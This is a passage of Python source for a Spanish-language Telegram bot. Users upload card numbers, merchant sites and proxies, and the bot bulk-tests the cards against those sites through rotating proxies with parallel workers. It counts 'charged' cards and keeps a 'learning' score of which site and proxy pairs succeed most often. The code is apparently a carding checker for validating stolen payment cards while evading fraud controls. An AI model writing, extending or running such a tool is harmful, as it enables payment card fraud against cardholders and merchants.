        card_data = CardValidator.parse_card(card_str)
        if card_data:
            valid_cards.append(card_data)
    
    sites = user_data["sites"]
    proxies = user_data["proxies"]

    if not valid_cards:
        await update.message.reply_text("❌ No hay tarjetas válidas cargadas.")
        return
    if not sites:
        await update.message.reply_text("❌ No hay sitios guardados.")
        return
    if not proxies:
        await update.message.reply_text("❌ No hay proxies guardados.")
        return

    num_workers = min(MAX_WORKERS_PER_USER, len(valid_cards))
    if context.args:
        try: num_workers = min(int(context.args[0]), MAX_WORKERS_PER_USER)
        except: pass

    # Mensaje inicial con barra vacía
    progress_msg = await update.message.reply_text(
        f"🚀 *Iniciando masivo*\n"
        f"📊 Progreso: {create_progress_bar(0, len(valid_cards))} 0/{len(valid_cards)}\n"
        f"✅ Aprobadas: 0 | ❌ Fallidas: 0 | ⚡ 0.0 cards/s\n"
        f"⚙️ Workers: {num_workers} | Usa /stop para cancelar",
        parse_mode="Markdown"
    )

    queue = asyncio.Queue()
    for card in valid_cards:
        await queue.put(card)

    results = []
    processed = 0
    success_count = 0
    start_time = time.time()
    last_update = time.time()
    
    learning = LearningSystem(db, user_id)
    cancel_mass[user_id] = False

    async def progress_callback(proc: int, succ: int, total: int):
        nonlocal last_update
        current_time = time.time()
        if current_time - last_update > 0.5:  # Actualizar cada 0.5 segundos
            elapsed = current_time - start_time
            speed = proc / elapsed if elapsed > 0 else 0
            fail = proc - succ
            bar = create_progress_bar(proc, total)
            
            await progress_msg.edit_text(
                f"📊 *Progreso:* {bar} {proc}/{total}\n"
                f"✅ Aprobadas: {succ} | ❌ Fallidas: {fail} | ⚡ {speed:.1f} cards/s\n"
                f"⚙️ Workers: {num_workers} | Usa /stop para cancelar",
                parse_mode="Markdown"
            )
            last_update = current_time

    # Ejecutar verificación masiva con callbacks de progreso
    try:
        results, success_count, elapsed = await card_service.check_mass(
            user_id=user_id,
            cards=valid_cards,
            sites=sites,
            proxies=proxies,
            num_workers=num_workers,
            progress_callback=progress_callback
        )
        
        # Si se canceló, no mostrar resumen final
        if cancel_mass.get(user_id, False):
            cancel_mass[user_id] = False
            return
        
        speed = len(valid_cards) / elapsed if elapsed > 0 else 0
        
        # Mensaje final con barra completa
        bar = create_progress_bar(len(valid_cards), len(valid_cards))
        summary = (f"✅ *¡PROCESO COMPLETADO!*\n"
                   f"📊 Progreso: {bar} {len(valid_cards)}/{len(valid_cards)}\n"
                   f"✅ Aprobadas: {success_count}\n"
                   f"❌ Fallidas: {len(valid_cards) - success_count}\n"
                   f"⚡ Velocidad: {speed:.1f} cards/s\n"
                   f"⏱️ Tiempo: {elapsed:.1f}s")
        
        await progress_msg.edit_text(summary, parse_mode="Markdown")
        
        # Mostrar algunas aprobadas si hay
        if success_count > 0:
            aprobadas = [r for r in results if r.success]
            if len(aprobadas) > 10:
                muestra = aprobadas[:10]
                lines = ["✅ *Tarjetas aprobadas (primeras 10):*"]
                for r in muestra:
                    lines.append(f"• `{r.card_bin}xxxxxx{r.card_last4}` - {r.response_time:.2f}s")
                lines.append(f"... y {len(aprobadas)-10} más.")
                await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
            elif aprobadas:
                lines = ["✅ *Tarjetas aprobadas:*"]
                for r in aprobadas:
                    lines.append(f"• `{r.card_bin}xxxxxx{r.card_last4}` - {r.response_time:.2f}s")
                await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
        
    except asyncio.CancelledError:
        await progress_msg.edit_text("⏹️ Proceso cancelado por el usuario", parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Error en mass: {e}", exc_info=True)
        await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}", parse_mode="Markdown")

async def learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    rows = await db.fetch_all(
        """SELECT * FROM learning 
           WHERE user_id = ? 
           ORDER BY attempts DESC, last_seen DESC 
           LIMIT 20""",
        (user_id,)
    )
    
    if not rows:
        await update.message.reply_text("📭 Aún no hay datos de aprendizaje.")
        return

    learning = LearningSystem(db, user_id)
    lines = ["🧠 *Top combinaciones:*"]
    
    for row in rows:
        site = row["site"][:30] + "..." if len(row["site"]) > 30 else row["site"]
        proxy = row["proxy"][:30] + "..." if len(row["proxy"]) > 30 else row["proxy"]
        score = await learning.get_score(row["site"], row["proxy"])
        success_rate = (row["charged"] / row["attempts"]) * 100 if row["attempts"] > 0 else 0
        avg_time = row["total_time"] / row["attempts"] if row["attempts"] > 0 else 0
        
        lines.append(f"• `{site}` | `{proxy}`")
        lines.append(f"  Intentos: {row['attempts']} | ✅ {success_rate:.1f}% | "
                    f"⏱️ {avg_time:.2f}s | Score: {score:.3f}")

    message = "\n".join(lines)
    
    if len(message) > 4000:
        filename = f"learn_{user_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(message.replace("*", ""))
        await update.message.reply_document(
            document=open(filename, "rb"),
            filename=filename,
            caption="🧠 *Aprendizaje completo* (en archivo)",
            parse_mode="Markdown"
        )
        os.remove(filename)
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    total = await db.fetch_one(
        "SELECT COUNT(*) as count FROM results WHERE user_id = ?",
        (user_id,)
    )
    total_count = total["count"] if total else 0
    
    charged = await db.fetch_one(
        "SELECT COUNT(*) as count FROM results WHERE user_id = ? AND status = 'charged'",
        (user_id,)
    )
    charged_count = charged["count"] if charged else 0
    
    timeouts = await db.fetch_one(
        "SELECT COUNT(*) as count FROM results WHERE user_id = ? AND status = 'timeout'",
        (user_id,)
    )
    timeout_count = timeouts["count"] if timeouts else 0
    
    avg_time = await db.fetch_one(
        "SELECT AVG(response_time) as avg FROM results WHERE user_id = ?",
        (user_id,)
    )
    avg_response = avg_time["avg"] if avg_time and avg_time["avg"] else 0
    
    rate = await db.fetch_one(
        "SELECT checks_today FROM rate_limits WHERE user_id = ?",
        (user_id,)
    )
    checks_today = rate["checks_today"] if rate else 0
    
    text = (f"📊 *Estadísticas*\n"
            f"Total verificaciones: {total_count}\n"
            f"✅ Charged: {charged_count}\n"
            f"⏱️ Timeouts: {timeout_count}\n"
            f"⚡ Tiempo medio: {avg_response:.2f}s\n"
            f"📅 Hoy: {checks_today}/{DAILY_LIMIT_CHECKS}")
    
    if len(text) > 4000:
        text = text[:4000] + "..."
    
    await update.message.reply_text(text, parse_mode="Markdown")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    cancel_mass[user_id] = True
    await user_manager.cancel_user_tasks(user_id)
    await update.message.reply_text("⏹️ Proceso cancelado (deteniéndose...)")

async def reset_learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await db.execute("DELETE FROM learning WHERE user_id = ?", (user_id,))
    await update.message.reply_text("🔄 Aprendizaje reiniciado")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Solo acepto archivos .txt")
        return

    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    text = file_content.decode('utf-8', errors='ignore')
    lines = text.splitlines()

    sites_added = []
    proxies_added = []
    cards_added = []
    invalid_cards = []
    unknown = []

    for raw_line in lines:
        line = raw_line.strip()
        if not line:
            continue

        line_type, normalized = detect_line_type(line)
        
        if line_type == 'site':
            sites_added.append(normalized)
        elif line_type == 'proxy':
            proxies_added.append(normalized)
        elif line_type == 'card':
            card_data = CardValidator.parse_card(normalized)
            if card_data:
                cards_added.append(normalized)
            else:
                invalid_cards.append(normalized)
        else:
            unknown.append(line)

    user_id = update.effective_user.id
    user_data = await user_manager.get_user_data(user_id)
    updated = False

    if sites_added:
        user_data["sites"].extend(sites_added)
        updated = True
    if proxies_added:
        normalized_proxies = []
        for p in proxies_added:
            if p.count(':') == 1:
                normalized_proxies.append(f"{p}::")
            else:
                normalized_proxies.append(p)
        user_data["proxies"].extend(normalized_proxies)
        updated = True
    if cards_added:
        user_data["cards"].extend(cards_added)
        updated = True

    if updated:
        await user_manager.update_user_data(
            user_id, 
            sites=user_data["sites"], 
            proxies=user_data["proxies"], 
            cards=user_data["cards"]
        )

    msg_parts = []
    if sites_added:
        msg_parts.append(f"✅ {len(sites_added)} sitio(s) añadido(s)")
    if proxies_added:
        msg_parts.append(f"✅ {len(proxies_added)} proxy(s) añadido(s)")
    if cards_added:
        msg_parts.append(f"✅ {len(cards_added)} tarjeta(s) válida(s) añadida(s)")
    if invalid_cards:
        msg_parts.append(f"⚠️ {len(invalid_cards)} tarjeta(s) inválida(s) rechazada(s)")
    if unknown:
        msg_parts.append(f"⚠️ {len(unknown)} línea(s) no reconocida(s)")

    if not msg_parts:
        await update.message.reply_text("❌ No se encontraron datos válidos.")
    else:
        await update.message.reply_text("\n".join(msg_parts))

# ================== MAIN ==================
async def shutdown(application: Application):
    logger.info("🛑 Cerrando conexiones...")
    if checker:
        await checker.shutdown()
    if db:
        await db.shutdown()
    logger.info("✅ Conexiones cerradas")

async def post_init(application: Application):
    global db, user_manager, checker, card_service
    
    db = Database()
    await db.initialize()
    
    user_manager = UserManager(db)
    checker = UltraFastChecker()
    await checker.initialize()
    
    card_service = CardCheckService(db, user_manager, checker)
    
    await db.cleanup_old_results()
    logger.info("✅ Bot inicializado correctamente")

def main():
    app = Application.builder().token(TOKEN).post_init(post_init).build()
    app.post_shutdown = shutdown

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addsite", addsite))
    app.add_handler(CommandHandler("addproxy", addproxy))
    app.add_handler(CommandHandler("sites", listsites))
    app.add_handler(CommandHandler("proxies", listproxies))
    app.add_handler(CommandHandler("cards", listcards))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("learn", learn_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("reset_learn", reset_learn_command))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))

    logger.info("🚀 Bot Profesional Ultra con barra de progreso iniciado")
    app.run_polling()

if __name__ == "__main__":
    main()
